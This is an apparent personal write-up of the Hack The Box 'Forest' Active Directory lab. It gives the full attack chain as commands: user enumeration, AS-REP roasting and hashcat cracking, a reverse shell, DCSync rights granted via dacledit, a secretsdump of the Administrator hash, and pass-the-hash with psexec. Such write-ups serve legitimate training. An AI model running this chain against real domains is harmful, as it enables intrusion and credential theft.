---
Category:
LAB: https://app.hackthebox.com/machines/Forest?sort_by=created_at&sort_type=desc
Difficulty: Easy
Featured: yes
aliases:
  - AD
  - Windwos
---

---
# Information / Description

![](../../0.%20Assets/Forest-1791195223279.webp)
![|202|274x281](../../0.%20Assets/Forest-1791195236528.webp)
---

# Walkthrough


We will start with the basics, let's do an `nmap` scan to see what this machine has to offer.

First let's find the ports

```
nmap $T -sS -Pn -n -p-  --min-rate 5000 -oG openPorts.gmap
```

- `$T` is a variable i created to store the IP of the target machine

We are  storing it in a `grepable` format because i have a little functionality called `"ExtractPorts"` in my `zsh` that takes a file and with grep copies the open ports to the clipboard do we don't have to write them manually and/or scan for all ports again

Here you can find the dotfiles for kali I created -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

```
nmap $T -sS -Pn -n -sVC --min-rate 5000 -oN results.txt -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49680,49681,49685,49700
```

![](../../0.%20Assets/Forest-1791195923651.webp)

I tried manually fingerprinting the `tcpwrapped` ports with `netcat` but with no success

```
nc -nv <port>
```

First thing I will do from here is figure out the domain and add it to the `/etc/hosts`

```
netexec smb $T
```

![](../../0.%20Assets/Forest-1791196050451.webp)

![](../../0.%20Assets/Forest-1791196124707.webp)

I tried some enumeration with no luck until I used `enum4linux`
So I used the following command to get the users in a list

```
enum4linux -U "$T" | grep 'user:' | cut -d '[' -f2 | cut -d ']' -f1 | sort -u | tee users.txt
```

![](../../0.%20Assets/Forest-1791198761973.webp)

So I decided to do an `AS-REP roasting attack` with the enumerated users

```
impacket-GetNPUsers 'htb.local/' \                                
  -usersfile users.txt \
  -no-pass \
  -dc-ip $T \
  -format hashcat \
  -outputfile asrep-impacket.txt
```


![](../../0.%20Assets/Forest-1791198929421.webp)

And we get a hash for the user `svc-alfresco`

So let's crack it

```
hashcat -m 18200 asrep-impacket.txt /usr/share/wordlists/rockyou.txt
```

![](../../0.%20Assets/Forest-1791199377120.webp)


![](../../0.%20Assets/Forest-1791199580038.webp)

I checked the shares of the user and didn't find anything interesting

![](../../0.%20Assets/Forest-1791200388596.webp)


Great, let's see what we can do with this user, i will be using [nxcspray](https://github.com/NTHSec/nxcspray) which is a great tool to test all protocols at the same time

```
./nxcspray all $T -u 'svc-alfresco' -p 's3rvice'
```

![](../../0.%20Assets/Forest-1791199683103.webp)

And we have access to the machine through `winrm`, let's connect with `evil-winrm`

```
evil-winrm -i $T -u svc-alfresco -p 's3rvice'
```

And I personally prefer `Penelope` to handle my shells so I will use a reverse shell payload on the `evil-winrm` connection to send me back the connection

```
penelope -O -p 1337 -a -i tun0
```

![](../../0.%20Assets/Forest-1791199925702.webp)

![](../../0.%20Assets/Forest-1791199985127.webp)

And we have the first flag, Let's do some enumeration inside the machine itself.

```
whoami /all
```

![](../../0.%20Assets/Forest-1791201109696.webp)

 `Service Accounts` , `Privileged IT accounts`, and `account operators` seems interesting.

Also seems like we are administrators but not high leve. 

I uploaded `Sharphound.ps1` and ``PowerUp.ps1``

![](../../0.%20Assets/Forest-1791200444151.webp)


I started with `PowerUp`

```
powershell -ep bypass  
. .\PowerUp.ps1  
Invoke-AllChecks
```

![](../../0.%20Assets/Forest-1791200677551.webp)

I will keep this in mind let's get the data for Bloodhound

I tried `sharphound` and was breaking so I recollected the data from 

```
bloodhound-python  -u svc-alfresco -p 's3rvice' -d htb.local -ns $T -c All --zip
```

Then we import the data into `Bloodhound`

![](../../0.%20Assets/Forest-1791202558075.webp)



![](../../0.%20Assets/Forest-1791202795596.webp)


Okay let's add ourselves to the group

```
net rpc group addmem "Exchange Windows Permissions" "svc-alfresco" -U "htb.local/svc-alfresco%s3rvice" -S 10.129.95.210
```


![](../../0.%20Assets/Forest-1791203599087.webp)

Great let's grant us the permission to do a `DCSync` attack

```
impacket-dacledit -action write -rights DCSync -principal svc-alfresco -target-dn "DC=htb,DC=local" -dc-ip 10.129.95.210 'htb.local/svc-alfresco:s3rvice'
```

And perform the `DCSync`

```
impacket-secretsdump -just-dc-user Administrator 'htb.local/svc-alfresco:s3rvice@10.129.95.210'
```

![](../../0.%20Assets/Forest-1791204399969.webp)

now we can pass the hash with `PsExec`

```
impacket-psexec hbt.local/Administrator@$T -hashes :32693b11e6aa90e....
```

![](../../0.%20Assets/Forest-1791204672258.webp)